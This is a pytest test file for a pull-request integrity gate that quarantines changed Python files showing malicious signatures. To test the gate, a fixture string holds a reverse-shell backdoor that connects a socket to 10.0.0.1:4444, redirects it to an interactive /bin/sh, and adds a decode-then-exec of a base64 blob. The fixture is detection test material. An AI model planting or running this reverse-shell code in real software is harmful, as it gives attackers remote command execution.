# CUI // SP-CTI
"""Tests for the SIPA PR diff gate (eqo-sipa-01).

Covers ``tools/integrity/pr_gates.py``'s ``assess_changed_files()`` + ``--gate``
CLI over a throw-away git repo built per-test:

  * **Clean change => ALLOW / exit 0** — a benign disclosed-style helper changed on
    the branch scores under the review threshold; the gate passes.
  * **Planted backdoor => QUARANTINE / exit 1** — a changed file with a
    decode-then-exec + reverse-shell snippet trips the malicious-signature regex
    fallback (critical ``known_bad_signature``), force-quarantining; ``--gate``
    exits 1.
  * **No changed *.py => pass** — a branch that changes only non-Python files
    short-circuits to ALLOW with nothing staged or written.
  * **Diff scoping** — only the changed Python files are assessed, not the whole
    tree (an unchanged sibling is excluded).
  * **--cached** — the staged-index diff path is exercised.
  * **Feature flag** — with ``ICDEV_INTEGRITY_ENABLED`` off the CLI no-ops to a
    pass (exit 0) even on a planted backdoor.

The pipeline runs for real (ingest -> scan_all -> capability extract -> score)
against an in-memory SQLite connection. The two subprocess-backed scanner seams
are stubbed for determinism + speed (mirrors test_integrity_engine.py):
``scanners._invoke_scanner`` returns an empty JSON document and
``scanners._detect_signatures`` returns ``None`` so the signature scan exercises
its deterministic regex fallback (no Semgrep binary required). ``git`` itself runs
for real against the per-test repo.
"""
import shutil
import sqlite3
import subprocess
import types

import pytest

from tools.db.storage import StorageConnection
from tools.integrity import engine, pr_gates, scanners
from tools.integrity.db import init_db as init_db_mod

# git is required to exercise the diff seam; skip the whole module if absent.
pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git not on PATH")


# --------------------------------------------------------------------------- #
# Source fixtures
# --------------------------------------------------------------------------- #
_BENIGN_PY = '''\
"""Tinylog — read and write log entries to a file on disk."""
from pathlib import Path


def write_entry(path, text):
    Path(path).write_text(text, encoding="utf-8")


def read_entries(path):
    return Path(path).read_text(encoding="utf-8")
'''

# Decode-then-exec + reverse-shell snippet (exec arbitrary command + outbound
# socket). The signature regex fallback writes a critical known_bad_signature,
# which force-quarantines regardless of the numeric score.
_BACKDOOR_PY = '''\
import base64
import os
import socket
import subprocess

_BLOB = "cHJpbnQoJ3B3bmVkJyk="  # base64 payload


def _callback():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    os.dup2(s.fileno(), 0)
    subprocess.call(["/bin/sh", "-i"])


def _run():
    exec(base64.b64decode(_BLOB))
'''


# --------------------------------------------------------------------------- #
# Git repo helpers
# --------------------------------------------------------------------------- #
def _git(repo_dir, *args):
    """Run a git command in ``repo_dir`` and return stripped stdout (raise on error)."""
    proc = subprocess.run(
        ["git", *args],
        cwd=str(repo_dir),
        capture_output=True,
        text=True,
        check=True,
    )
    return proc.stdout.strip()


def _init_repo(repo_dir):
    """Initialize a git repo with an identity and an empty base commit."""
    repo_dir.mkdir(parents=True, exist_ok=True)
    _git(repo_dir, "init", "-q")
    _git(repo_dir, "config", "user.email", "test@icdev.local")
    _git(repo_dir, "config", "user.name", "ICDEV Test")
    _git(repo_dir, "config", "commit.gpgsign", "false")
    # An empty base commit gives a stable ref to diff <base>...HEAD against.
    _git(repo_dir, "commit", "-q", "--allow-empty", "-m", "base")
    return _git(repo_dir, "rev-parse", "HEAD")


def _write(repo_dir, rel, content):
    path = repo_dir / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


def _commit(repo_dir, message):
    _git(repo_dir, "add", "-A")
    _git(repo_dir, "commit", "-q", "-m", message)
    return _git(repo_dir, "rev-parse", "HEAD")


# --------------------------------------------------------------------------- #
# Pytest fixtures
# --------------------------------------------------------------------------- #
@pytest.fixture
def conn():
    """A SQLite connection wrapped as production hands one to the SIPA engine.

    The engine authors its SQL PostgreSQL-first (``%s`` placeholders). A bare
    sqlite3.Connection rejects those — capability_extractor._persist() died
    with ``near "%": syntax error``. get_connection() returns a
    StorageConnection in production, whose translate_sql rewrites ``%s`` ->
    ``?`` for SQLite, so the wrapper is what the code under test actually sees.
    """
    raw = sqlite3.connect(":memory:")
    raw.row_factory = sqlite3.Row
    init_db_mod.init_db(raw)
    yield StorageConnection(raw, "sqlite")
    raw.close()


@pytest.fixture
def deterministic_scanners(monkeypatch, tmp_path):
    """Make scan_all deterministic + fast and isolate the quarantine dir."""
    monkeypatch.setenv("ICDEV_INTEGRITY_QUARANTINE_DIR", str(tmp_path / "quarantine"))
    monkeypatch.setenv("ICDEV_STORAGE_BACKEND", "sqlite")
    monkeypatch.setattr(scanners, "_invoke_scanner", lambda cmd, timeout: (0, "{}", ""))
    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: None)


@pytest.fixture
def repo(tmp_path):
    """A fresh git repo with an empty base commit; ``.dir`` + ``.base_sha``."""
    r = tmp_path / "repo"
    base_sha = _init_repo(r)
    return types.SimpleNamespace(dir=r, base_sha=base_sha)


# --------------------------------------------------------------------------- #
# assess_changed_files — clean change => ALLOW
# --------------------------------------------------------------------------- #
def test_clean_change_is_allow(repo, conn, deterministic_scanners):
    _write(repo.dir, "pkg/tinylog.py", _BENIGN_PY)
    _commit(repo.dir, "add tinylog")

    result = pr_gates.assess_changed_files(base=repo.base_sha, conn=conn, repo_root=repo.dir)

    assert result["verdict"] == "allow"
    assert result["risk_score"] < 40
    assert result["files_assessed"] == ["pkg/tinylog.py"]
    assert result["assessment_id"] is not None
    # No malicious-signature finding on the benign file.
    assert all(f["finding_type"] != "known_bad_signature" for f in result["findings"])


# --------------------------------------------------------------------------- #
# assess_changed_files — planted backdoor => QUARANTINE
# --------------------------------------------------------------------------- #
def test_planted_backdoor_is_quarantine(repo, conn, deterministic_scanners):
    _write(repo.dir, "pkg/helper.py", _BACKDOOR_PY)
    _commit(repo.dir, "add helper")

    result = pr_gates.assess_changed_files(base=repo.base_sha, conn=conn, repo_root=repo.dir)

    assert result["verdict"] == "quarantine"
    assert result["files_assessed"] == ["pkg/helper.py"]
    # The signature regex fallback wrote a critical known_bad_signature finding,
    # mapped back to the PR-relative path (path-preserving subtree). Findings carry
    # OS-native separators, so normalize before comparing.
    sig = [f for f in result["findings"] if f["finding_type"] == "known_bad_signature"]
    assert sig, "expected a known_bad_signature finding"
    assert any(f["severity"] == "critical" for f in sig)
    assert all((f["file_path"] or "").replace("\\", "/") == "pkg/helper.py" for f in sig)


# --------------------------------------------------------------------------- #
# assess_changed_files — no changed *.py => pass (short-circuit)
# --------------------------------------------------------------------------- #
def test_no_python_files_passes(repo, conn, deterministic_scanners):
    _write(repo.dir, "README.md", "# docs only\n")
    _write(repo.dir, "data/config.yaml", "key: value\n")
    _commit(repo.dir, "docs + config only")

    result = pr_gates.assess_changed_files(base=repo.base_sha, conn=conn, repo_root=repo.dir)

    assert result["verdict"] == "allow"
    assert result["risk_score"] == 0.0
    assert result["files_assessed"] == []
    assert result["findings"] == []
    assert result["assessment_id"] is None  # nothing staged or written


# --------------------------------------------------------------------------- #
# Diff scoping — only changed Python files are assessed
# --------------------------------------------------------------------------- #
def test_only_changed_files_assessed(repo, conn, deterministic_scanners):
    # Sibling already on the base — committed before we capture the diff base.
    _write(repo.dir, "pkg/untouched.py", _BACKDOOR_PY)
    sibling_base = _commit(repo.dir, "pre-existing sibling")

    # The PR only changes the benign file; the backdoor sibling is NOT in the diff.
    _write(repo.dir, "pkg/tinylog.py", _BENIGN_PY)
    _commit(repo.dir, "add tinylog")

    result = pr_gates.assess_changed_files(base=sibling_base, conn=conn, repo_root=repo.dir)

    assert result["files_assessed"] == ["pkg/tinylog.py"]
    assert result["verdict"] == "allow"  # the unchanged backdoor sibling is excluded


# --------------------------------------------------------------------------- #
# Dependency-manifest scoping — a changed manifest IS staged + assessed, and a
# benign code-only change stages NO manifest (so the deps scanner can never audit
# the ambient repo environment). Regression: eqo-sipa-s2.
# --------------------------------------------------------------------------- #
def test_changed_dependency_manifest_is_assessed(repo, conn, deterministic_scanners):
    """A PR that touches requirements.txt stages the manifest for the deps scan."""
    _write(repo.dir, "requirements.txt", "flask==0.12.2\n")
    _write(repo.dir, "pkg/app.py", _BENIGN_PY)
    _commit(repo.dir, "bump deps + code")

    result = pr_gates.assess_changed_files(base=repo.base_sha, conn=conn, repo_root=repo.dir)

    assert "requirements.txt" in result["files_assessed"]
    assert "pkg/app.py" in result["files_assessed"]


def test_benign_code_change_stages_no_manifest(repo, conn, deterministic_scanners):
    """A benign code-only change stages only the *.py file — no dep manifest.

    With no manifest in the staged subtree the deps scanner has nothing to audit,
    so it cannot pull in ambient/repo-wide CVEs (the over-blocking defect).
    """
    # A pre-existing requirements.txt on the base branch (NOT part of the PR).
    _write(repo.dir, "requirements.txt", "flask==0.12.2\n")
    base_with_reqs = _commit(repo.dir, "pre-existing requirements")

    # The PR changes only a benign .py file.
    _write(repo.dir, "pkg/tinylog.py", _BENIGN_PY)
    _commit(repo.dir, "add tinylog")

    result = pr_gates.assess_changed_files(base=base_with_reqs, conn=conn, repo_root=repo.dir)

    assert result["files_assessed"] == ["pkg/tinylog.py"]
    assert not any(_is_manifest(f) for f in result["files_assessed"])
    assert result["verdict"] == "allow"


def _is_manifest(rel):
    return pr_gates._is_dep_manifest(rel)


# --------------------------------------------------------------------------- #
# --cached — staged-index diff path
# --------------------------------------------------------------------------- #
def test_cached_diff_path(repo, conn, deterministic_scanners):
    _write(repo.dir, "pkg/staged.py", _BENIGN_PY)
    _git(repo.dir, "add", "pkg/staged.py")  # staged, not committed

    result = pr_gates.assess_changed_files(cached=True, conn=conn, repo_root=repo.dir)

    assert result["files_assessed"] == ["pkg/staged.py"]
    assert result["verdict"] == "allow"


# --------------------------------------------------------------------------- #
# CLI --gate exit codes
# --------------------------------------------------------------------------- #
def test_cli_gate_allow_exits_zero(repo, conn, deterministic_scanners, monkeypatch):
    monkeypatch.setenv("ICDEV_INTEGRITY_ENABLED", "true")
    _write(repo.dir, "pkg/tinylog.py", _BENIGN_PY)
    _commit(repo.dir, "add tinylog")

    with pytest.raises(SystemExit) as exc:
        pr_gates.main(
            ["--base", repo.base_sha, "--repo-root", str(repo.dir), "--gate", "--json"],
            conn=conn,
        )
    assert exc.value.code == engine.GATE_OK


def test_cli_gate_quarantine_exits_one(repo, conn, deterministic_scanners, monkeypatch):
    monkeypatch.setenv("ICDEV_INTEGRITY_ENABLED", "true")
    _write(repo.dir, "pkg/helper.py", _BACKDOOR_PY)
    _commit(repo.dir, "add helper")

    with pytest.raises(SystemExit) as exc:
        pr_gates.main(
            ["--base", repo.base_sha, "--repo-root", str(repo.dir), "--gate", "--json"],
            conn=conn,
        )
    assert exc.value.code == engine.GATE_BLOCK


# --------------------------------------------------------------------------- #
# Feature flag — CLI no-ops to a pass when ICDEV_INTEGRITY_ENABLED is off
# --------------------------------------------------------------------------- #
def test_cli_honors_feature_flag_off(repo, conn, deterministic_scanners, monkeypatch):
    monkeypatch.delenv("ICDEV_INTEGRITY_ENABLED", raising=False)
    # A planted backdoor that WOULD quarantine if the gate ran.
    _write(repo.dir, "pkg/helper.py", _BACKDOOR_PY)
    _commit(repo.dir, "add helper")

    with pytest.raises(SystemExit) as exc:
        pr_gates.main(
            ["--base", repo.base_sha, "--repo-root", str(repo.dir), "--gate", "--json"],
            conn=conn,
        )
    # Flag off => skipped => pass, despite the backdoor.
    assert exc.value.code == engine.GATE_OK
